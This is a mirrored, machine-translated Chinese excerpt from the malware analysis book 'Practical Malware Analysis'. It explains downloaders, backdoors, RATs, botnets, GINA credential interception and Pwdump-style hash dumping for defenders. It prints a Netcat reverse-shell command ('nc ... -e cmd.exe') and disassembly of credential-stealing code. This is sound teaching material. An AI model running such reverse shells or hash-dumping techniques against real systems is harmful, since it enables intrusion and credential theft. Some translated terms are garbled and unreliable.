<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🤳 🧠 🧑🏻 这本书“将进行尸检！” 实用的恶意软件分析» 🚶🏼 🕺🏻 🎚️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="恶意软件分析类似于猫和老鼠的游戏：没有规则，情况在不断变化。 因此，在这种情况下，仅研究永恒的事物和算法是有意义的。 一旦您面临保护网络（或一千个网络）的任务，便会进行这样的分析，而如果没有本书，您将无可避免。 

 下载和运行软件的程序 
 有两种用于下载和运行软件的常见恶意软件。 下载程序（不要...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>这本书“将进行尸检！” 实用的恶意软件分析»</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/piter/blog/416143/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><img src="https://habrastorage.org/webt/jk/0g/rv/jk0grvjx0tqi91gqj9v6qmsqahs.jpeg" align="left" alt="图片"></a> 恶意软件分析类似于猫和老鼠的游戏：没有规则，情况在不断变化。 因此，在这种情况下，仅研究永恒的事物和算法是有意义的。 一旦您面临保护网络（或一千个网络）的任务，便会进行这样的分析，而如果没有本书，您将无可避免。 <br><br><h3> 下载和运行软件的程序 </h3><br> 有两种用于下载和运行软件的常见恶意软件。 下载程序（不要与系统下载程序混淆）只是从Internet下载其他恶意代码并在本地计算机上运行。 它们通常与漏洞利用程序一起分发。 他们通常使用两个Windows API调用，一个接一个，以下载并执行其他恶意软件：URLDownloadtoFileA和WinExec。 <br><a name="habracut"></a><br> 启动器（启动器）是一个可执行文件，可安装恶意应用程序以隐藏执行（立即或在一段时间后）。 启动器通常会附带需要运行的软件。 我们将在第12章中讨论它们。 <br><br><h4> 后门 </h4><br> 后门程序是使攻击者可以访问受害者计算机的程序。 它们是最容易检测到的恶意软件类型，其大小和功能集可能会有很大差异。 后门代码通常是自包含的，不需要下载其他受感染的文件。 <br><br> 后门以多种不同的方式通过Internet进行交互，但数据通常通过端口80通过HTTP传输。HTTP构成了大部分传出网络流量，这为恶意软件提供了一个很好的机会，使其他信息不受注意。 <br><br> 在第14章中，您将学习如何在数据包级别分析后门，如何创建有效的网络签名。 同时，我们将专注于高层交互。 <br> 后门具有一组标准功能：能够操纵注册表项，对显示的窗口进行计数，创建目录，搜索文件等。要了解后门使用了哪些功能，可以检查其导入的Windows API函数。 附录A提供了一些常用功能列表，这些常用功能描述了他们对恶意软件的评价。 <br><br><h3> 反向命令外壳 </h3><br> 反向命令外壳是一种连接，可启动受感染的计算机，从而向攻击者提供命令访问权限。 它可以是单独的恶意程序，也可以是更复杂的后门程序的组件之一。 在反向命令外壳中，攻击者可以像执行所有这些操作一样在其本地系统上执行命令。 <br><br><h4>  Netcat反向命令外壳 </h4><br> 如果您在两台计算机上运行命令，我们在第3章中讨论过的Netcat程序可用于创建命令外壳。 攻击者经常自己使用它，并与其他恶意软件互补。 <br> 要这样使用Netcat，远程系统必须使用以下命令等待传入连接： <br><br><pre><code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">nc</span></span> -l –p <span class="hljs-number"><span class="hljs-number">80</span></span></code> </pre> <br>  -l开关将Netcat切换到侦听模式，-p开关确定要监视的端口。 接下来，受害者的计算机启动传出连接并提供其命令外壳： <br><br><pre> <code class="hljs dos">nc _ip <span class="hljs-number"><span class="hljs-number">80</span></span> -e <span class="hljs-built_in"><span class="hljs-built_in">cmd</span></span>.exe</code> </pre> <br>  ip 80侦听器是远程主机的IP地址和端口。  -e选项使您可以指定建立连接时将运行的程序。 它的标准输入和输出将绑定到套接字（如您稍后将看到的，Windows经常使用cmd.exe）。 <br><br><h4>  Windows反向外壳 </h4><br> 攻击者在Windows中使用两种简单的基于cmd.exe的反向命令外壳实现：基本和多线程。 <br><br> 该基本方法在恶意软件作者中颇为流行，因为它更易于实现，并且通常不比多线程方法差。 它基于调用CreateProcess并更改传递给它的STARTUPINFO结构。 首先，创建一个套接字并与远程服务器建立连接。 然后，将此套接字附加到cmd.exe进程的标准线程（输入，输出和错误流）。  CreateProcess在无窗口模式下运行cmd.exe使其对受害者隐藏。 第7章提供了此技术的示例。 <br><br>  Windows反向命令外壳程序的多线程版本意味着创建一个套接字，两个管道和两个线程（因此，应查找CreateThread和CreatePipe调用）。 恶意软件作者有时将此方法用作修改或编码通过套接字传输的数据的策略的一部分。  CreatePipe函数可用于绑定到通道的读取和写入端，例如标准输入（stdin）和标准输出（stdout）。  CreateProcess函数允许您将标准线程绑定到通道，而不是直接绑定到套接字。 调用后，恶意软件将创建两个执行线程：一个用于从stdin通道读取并写入套接字，另一个用于从套接字中读取并写入stdout通道。 通常，这些线程正在编码数据，我们将在第13章中讨论。使用逆向工程方法，您可以检查流解码在加密会话期间接收到的数据包的分支。 <br><br><h3> 远程管理工具 </h3><br> 远程管理工具（RAT）用于控制网络上的一台或多台计算机。 他们经常参与目标明确的攻击-例如，在窃取信息或在计算机之间移动时。 <br><br> 在图。  11.1显示了RAT的网络结构。 在受害者系统上运行的服务器装有恶意代码。 客户端可以远程工作，因为控制模块可供攻击者使用。 服务器向客户端发出信号，由客户端控制它们启动连接。  RAT中的互通通常通过标准端口（例如80或443）进行。 <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/kj/7f/px/kj7fpxqhevkd2db817n4rjulxuu.png" alt="图片"></div><br><h3> 僵尸网络 </h3><br> 僵尸网络是受感染的网络节点（僵尸）的集合，这些节点通常使用称为僵尸网络控制器的服务器进行集中管理。 僵尸网络的目标是感染尽可能多的计算机，并基于这些计算机创建一个大型网络，该网络可用于传播其他恶意软件或垃圾邮件以及执行DDoS攻击（分布式拒绝服务）。 ） 如果所有僵尸同时开始攻击某个站点，则可能无法访问。 <br><br><h3>  RAT与僵尸网络的比较 </h3><br> 僵尸网络与远程管理工具之间有几个重要区别。 <br><br><ul><li> 僵尸网络已知会感染和控制数百万个节点。  RAT通常由少得多的计算机运行。 </li><li> 所有僵尸网络参与者都被同时管理。  RAT允许您在不同的受害者之间分配资源，因为攻击者可以与受感染的系统进行更紧密的交互。 </li><li>  RAT用于狭窄目标的攻击，而僵尸网络以数量众多而著称。 </li></ul><br><h3> 凭证盗窃 </h3><br> 攻击者经常采取各种技巧来窃取凭据。 对于三种类型的恶意软件尤其如此。 <br><br><ul><li> 程序会在用户登录系统时窃取用户凭据。 </li><li> 复制Windows中存储的信息（密码，哈希等）以直接使用或进一步解密的程序。 </li><li> 记录击键的程序。 </li></ul><br> 在本节中，我们将研究每种类型的恶意软件。 <br><br><h3>  GINA拦截 </h3><br>  Windows XP使用一种技巧来窃取凭据，该技巧包括拦截GINA（图形标识和身份验证）。 创建GINA系统是为了允许第三方应用程序自行调整登录过程，从而增加了对基于令牌或智能卡的射频识别（RFID）等技术的支持。 恶意软件作者借此机会下载窃取凭据的代码。 <br><br>  GINA被实现为一个名为msgina.dll的DLL，并在登录期间由Winlogon加载。  Winlogon还支持第三方插件，将它们加载到GINA DLL之前（例如在中间攻击中）。 为了方便起见，Windows提供了以下注册表分支，Winlogon可以在其中找到并加载第三方DLL： <br><br><pre> <code class="hljs tex">HKLM<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SOFTWARE</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Microsoft</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Windows</span></span></span></span> NT<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">CurrentVersion</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Winlogon</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">GinaDLL</span></span></span></span></code> </pre> <br> 一旦我们在此处找到受感染的fsgina.dll文件，原来是GINA拦截器。 <br> 在图。 图11.2显示了一个示例，该示例说明了登录信息如何从Winlogon传递到msgina.dll并进入恶意库。 该恶意软件（fsgina.dll）设法拦截用户在身份验证期间输入的所有凭据。 他可以将其写入磁盘或通过网络传输。 <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/ge/eh/ma/geehmaneqdvfmxkmq9-8drvs5cc.png" alt="图片"></div><br> 由于fsgina.dll库拦截了Winlogon与GINA之间的交互流，因此必须将其进一步传递给msgina.dll，以便系统继续正常运行。 为此，恶意软件必须导出GINA系统所需的所有功能-其中有15种以上，并且大多数具有Wlx前缀。 显然，如果您在DLL中找到许多以Wlx开头的导出功能，则很可能会假定这是GINA拦截器。 <br><br> 这些导出调用大多数都访问msgina.dll中的实际函数。 对于fsgina.dll，这适用于WlxLoggedOutSAS以外的所有功能。 清单11.1显示了将WlxLoggedOutSAS导出到fsgina.dll。 <br><br> 清单11.1  GINA DLL中的WlxLoggedOutSAS导出功能记录了被盗凭证 <br><br><pre> <code class="hljs powershell"><span class="hljs-number"><span class="hljs-number">100014</span></span>A0 WlxLoggedOutSAS <span class="hljs-number"><span class="hljs-number">100014</span></span>A0 push esi <span class="hljs-number"><span class="hljs-number">100014</span></span>A1 push edi <span class="hljs-number"><span class="hljs-number">100014</span></span>A2 push offset aWlxloggedout_0 ; <span class="hljs-string"><span class="hljs-string">"WlxLoggedOutSAS"</span></span> <span class="hljs-number"><span class="hljs-number">100014</span></span>A7 call Call_msgina_dll_<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(1)</span></span></span><span class="hljs-function"> ... </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">100014FB</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">eax</span></span></span><span class="hljs-function"> ; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Args</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">100014FC</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">offset</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">aUSDSPSOpS</span></span></span><span class="hljs-function"> ;"</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">U</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">D</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">P</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">OP</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function">" </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">10001501</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">offset</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">aDRIVERS</span></span></span><span class="hljs-function"> ; "</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">drivers</span></span></span><span class="hljs-function">\</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">tcpudp</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sys</span></span></span><span class="hljs-function">" </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">10001503</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">call</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Log_To_File</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(2)</span></span></span></span></code> </pre> <br> 使用指定为Call_msgina_dll_function（1）的调用，凭据信息立即传输到msgina.dll文件。 此函数从msgina.dll动态定位并启动WlxLoggedOutSAS调用，该调用被指定为参数。 第（2）行的呼叫记录数据。 作为参数，它使用记帐信息，将显示该信息的格式字符串以及要记录的文件名。 结果，有关任何成功登录的信息将保存到％SystemRoot％\ system32 \ drivers \ tcpudp.sys文件中。 该文件包含用户名，域和两个密码-当前密码和旧密码。 <br><br><h3> 保存哈希 </h3><br>  Windows上的恶意软件通常会节省系统哈希值，以获取凭据。 保存后，攻击者尝试脱机解密这些散列，或使用它们像哈希传递一样进行攻击。 在此攻击期间，LM和NTLM散列用于远程NTLM身份验证，该身份验证不需要解密并获取相应的密码。 <br><br> 为了节省哈希，有免费的Pwdump和哈希传递（PSH）软件包。 由于这两个工具都是开源的，因此已经在它们的基础上创建了许多恶意软件。 <br><br> 大多数防病毒软件都为这些实用程序的标准编译版本提供了签名，因此攻击者经常尝试编译自己的变体以避免检测到。 本章中的示例是我们在现实生活中遇到的pwdump和PSH的类型。 <br><br>  Pwdump是一组程序，它们从安全帐户管理器（SAM）以LM i NTLM格式输出属于本地用户的哈希。  Pwdump将DLL注入到LSASS进程（本地安全机构子系统服务）中，该进程通常称为lsass.exe。 我们将在第12章中讨论DLL的实现，但是现在，您只需要知道这是一种技术，恶意软件就可以利用其所有特权在其他进程内部执行库。 用于保存哈希的工具通常会攻击lsass.exe进程，因为它具有足够的特权并可以访问许多有用的API函数。 <br><br>  Pwdump的标准版本使用lsaext.dll库。 当将其注入lsass.exe中时，它将调用GetHash函数，该函数从lsaext.dll中导出以检索哈希。 在这种情况下，将使用未记录的Windows函数，这将使您能够获取系统中所有用户的序列号以及每个用户的未加密密码散列。 <br><br> 面对Pwdump的变体，您需要分析其库以了解如何保存哈希。 首先要注意导出功能。 默认情况下，GetHash调用是从Pwdump导出的，但是攻击者可以轻松更改其名称以使其难以识别。 然后，您应该尝试确定导出调用中使用的功能。 它们中的许多可以动态定位；因此，导出调用通常会重用GetProcAddress操作。 <br><br> 清单11.2显示了一个版本的Pwdump的DLL中的GrabHash导出功能代码。 由于该库已嵌入lsass.exe中，因此在使用许多字符之前，它首先必须在手动模式下找到它们。 <br><br> 清单11.2。 在Pwdump变体之一中，GrabHash导出功能使用的唯一API调用 <br><br><pre> <code class="hljs perl"><span class="hljs-number"><span class="hljs-number">1000123</span></span>F <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset LibFileName ; <span class="hljs-string"><span class="hljs-string">"samsrv.dll"</span></span> (<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-number"><span class="hljs-number">10001244</span></span> call esi ; LoadLibraryA <span class="hljs-number"><span class="hljs-number">10001248</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aAdvapi32_dll_<span class="hljs-number"><span class="hljs-number">0</span></span> ; <span class="hljs-string"><span class="hljs-string">"advapi32.dll"</span></span> (<span class="hljs-number"><span class="hljs-number">2</span></span>) ... <span class="hljs-number"><span class="hljs-number">10001251</span></span> call esi ; LoadLibraryA ... <span class="hljs-number"><span class="hljs-number">1000125</span></span>B <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset ProcName ; <span class="hljs-string"><span class="hljs-string">"SamIConnect"</span></span> <span class="hljs-number"><span class="hljs-number">10001260</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">10001265</span></span> call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">10001281</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSamrqu ; <span class="hljs-string"><span class="hljs-string">"SamrQueryInformationUser"</span></span> <span class="hljs-number"><span class="hljs-number">10001286</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">1000128</span></span>C call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">100012</span></span>C2 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSamigetpriv ; <span class="hljs-string"><span class="hljs-string">"SamIGetPrivateData"</span></span> <span class="hljs-number"><span class="hljs-number">100012</span></span>C7 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>CD call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">100012</span></span>CF <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSystemfuncti ; <span class="hljs-string"><span class="hljs-string">"SystemFunction025"</span></span> (<span class="hljs-number"><span class="hljs-number">3</span></span>) <span class="hljs-number"><span class="hljs-number">100012</span></span>D4 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> edi ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>DA call esi ; GetProcAddress <span class="hljs-number"><span class="hljs-number">100012</span></span>DC <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSystemfuni_<span class="hljs-number"><span class="hljs-number">0</span></span> ; <span class="hljs-string"><span class="hljs-string">"SystemFunction027"</span></span> (<span class="hljs-number"><span class="hljs-number">4</span></span>) <span class="hljs-number"><span class="hljs-number">100012</span></span>E1 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> edi ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>E7 call esi ; GetProcAddress</code> </pre> <br> 清单11.2显示了通过调用LoadLibrary检索samsrv.dll（1）和advapi32.dll（2）库描述符的代码。  samsrv.dll文件包含可轻松访问SAM的API，并且发现advapi32.dll文件可访问未导入lsass.exe的功能。 此变体Pwdump的动态库使用这些库的描述符来搜索许多功能。 清单中显示了五个最重要的参数（请注意GetProcAddress调用及其参数）。 <br><br> 从samsrv.dll导入了有趣的调用，例如SamIConnect，SamrQueryInformationUser和SamIGetPrivateData。 随后，使用SamIConnect调用连接到SAM，然后为系统中的每个用户调用SamrQueryInformationUser函数。 <br><br> 使用SamIGetPrivateData调用检索哈希，然后使用从advapi32.dll导入的SystemFunction025和SystemFunction027函数解密（第（2）和（3）行）。 官方文档中没有列出此清单中的API函数。 <br><br>  PSH Toolkit包含创建哈希转储的程序。 这些垃圾堆中最受欢迎的垃圾堆被称为whosthere-alt。 它存储通过将DLL嵌入lsass.exe中获得的SAM内容。 同时，与Pwdump相比，使用了完全不同的API函数集。 清单11.3显示了whosthere-alt的版本代码，该版本代码导出一个名为TestDump的函数。 <br><br> 清单11.3。  whosthere-alt版本的导出函数TestDump使用的唯一API调用 <br><br><pre> <code class="hljs sql">10001119 push offset LibFileName ; "secur32.dll" 1000111E <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:LoadLibraryA <span class="hljs-number"><span class="hljs-number">10001130</span></span> push <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> ProcName ; "LsaEnumerateLogonSessions" 10001135 push esi ; hModule 10001136 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetProcAddress (<span class="hljs-number"><span class="hljs-number">1</span></span>) ... <span class="hljs-number"><span class="hljs-number">10001670</span></span> <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetSystemDirectoryA <span class="hljs-number"><span class="hljs-number">10001676</span></span> mov edi, <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> aMsv1_0_dll ; \\msv1_0.dll ... 100016A6 push eax ; path to msv1_0.dll 100016A9 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetModuleHandleA (<span class="hljs-number"><span class="hljs-number">2</span></span>)</code> </pre> <br> 由于此库嵌入在lsass.exe中，因此其TestDump函数将创建哈希转储。 它动态加载secur32.dll文件，并在其中找到LsaEnumerateLogonSessions（1）调用以获取本地唯一标识符（LUID）的列表。 此列表包含每次登录时指示的名称和域。 图书馆通过它们来访问会计信息。 为此，她使用对GetModuleHandle（2）的调用，在msv1_0.dll中搜索未导出的函数NlpGetPrimaryCredential，该函数允许转储NT和LM哈希。 <br><br><h3> 关于作者 </h3><br>  <b>Michael Sikorski</b>是Mandiant的安全专家。 作为事件调查的一部分，他参与了恶意软件分析，并且是美国政府信息安全顾问。  Michael开发了一系列恶意软件分析课程，并向FBI和Black Hat等不同的受众授课。 加入Mandiant之前，他是麻省理工学院林肯实验室的一名员工，从事无源网络拓扑和渗透测试的研究。 此外，迈克尔在国家安全局完成了为期三年的系统和网络跨学科培训计划。 在培训期间，他参加了逆向工程技术的研究，并在网络分析领域获得了多个奖项。 <br><br>  <b>Andrew Honig</b>是美国国防部的一名信息安全专家。 他在国立密码学院教授Windows操作系统（OS）的软件分析，逆向工程和编程，同时是一名经过认证的信息系统安全专家。 由于安德鲁（Andrew）对VMware虚拟化进行了数次零日漏洞利用，以及用于检测创新恶意软件的工具，包括受感染的内核模块。 作为计算机安全领域的分析师，他拥有十年的经验，因此被认为是分析和解释恶意程序和普通程序的专家。 <br><br>  »这本书的更多信息可以<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">在出版商的网站上找到</a> <br>  » <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">目录</a> <br>  » <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">摘录</a> <br><br> 对于Khabrozhiteley优惠券20％的折扣- <b>将会进行验尸</b> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN416143/">https://habr.com/ru/post/zh-CN416143/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN416131/index.html">如何在俄罗斯联邦处理违约概率而不违反法律</a></li>
<li><a href="../zh-CN416133/index.html">国外数据中心：Equinix LD8</a></li>
<li><a href="../zh-CN416135/index.html">小于1 kb的GUI应用程序</a></li>
<li><a href="../zh-CN416137/index.html">Zabbix作为安全扫描程序</a></li>
<li><a href="../zh-CN416139/index.html">强大的身份验证是GDPR战略的一部分</a></li>
<li><a href="../zh-CN416147/index.html">使用根控制器在iOS应用程序中组织导航</a></li>
<li><a href="../zh-CN416149/index.html">可再生能源问答，第1部分</a></li>
<li><a href="../zh-CN416151/index.html">无量纲的气球。 功利维度分析魔术</a></li>
<li><a href="../zh-CN416153/index.html">飞机会变得更可靠吗？ 飞机制造商向企业介绍机器人</a></li>
<li><a href="../zh-CN416155/index.html">Angular中的WebSockets：创建Angular Service以使用Web套接字</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>